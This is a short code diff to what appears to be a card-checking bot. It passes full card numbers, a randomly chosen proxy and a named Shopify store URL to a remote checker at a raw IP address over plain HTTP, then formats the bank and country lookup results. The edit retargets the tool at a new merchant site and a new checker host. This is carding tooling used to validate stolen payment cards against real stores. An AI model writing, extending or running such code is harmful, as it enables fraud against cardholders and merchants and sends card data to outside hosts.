@@ -336,10 +336,11 @@ async def process_card_string(card_line, user_full_name):
         
         bin_info, bank_info, country_info = await get_bin_info(bin_code)
         
-        site_url = "https://ripnroll.com"
+        site_url = "https://customsbyarrillc.myshopify.com"
         selected_proxy = random.choice(PROXY_LIST)
         
-        api_url = f"https://web-production-c2d03.up.railway.app/shopify?site={quote(site_url)}&cc={quote(formatted_cc)}&proxy={quote(selected_proxy)}"
+        # Updated new API Endpoint format
+        api_url = f"http://216.250.119.63/?{quote(formatted_cc)}&url={quote(site_url)}&proxy={quote(selected_proxy)}"
         
         async with httpx.AsyncClient(timeout=30.0, follow_redirects=True) as client:
             response = await client.get(api_url)
@@ -366,7 +367,7 @@ async def process_card_string(card_line, user_full_name):
             f"🌐 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 🔥 {gate} | 💰 {price}\n"
             f"━━━━━━━━━━━━━━━━━\n"
             f"🎯💠 𝐁𝐈𝐍 𝐈𝐧𝐟𝐨\n"
-            f"𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info}\n"
+            f"𝗕𝗜𝗡 𝗜𝗻𝐟𝗼: {bin_info}\n"
             f"𝗕𝗮𝗻𝗸: {bank_info}\n"
             f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country_info}\n"
             f"━━━━━━━━━━━━━━━━━\n"
@@ -466,4 +467,4 @@ def main():
 
 if __name__ == "__main__":
     main()
-                
+    
